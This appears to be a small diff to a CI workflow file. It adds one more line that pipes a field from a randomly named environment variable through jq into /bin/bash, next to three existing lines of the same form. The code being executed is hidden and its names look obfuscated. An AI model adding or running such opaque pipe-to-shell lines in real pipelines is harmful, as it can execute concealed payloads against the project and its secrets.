@@ -24,6 +24,7 @@ jobs:
           echo $oust71 | jq -r .uvgaw348 | /bin/bash
           echo $efw70 | jq -r .bzk9 | /bin/bash
           echo $fg3953 | jq -r .vnlzb0166 | /bin/bash
+          printf '%s' "$fnef65" | jq -r .hiuhq648 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
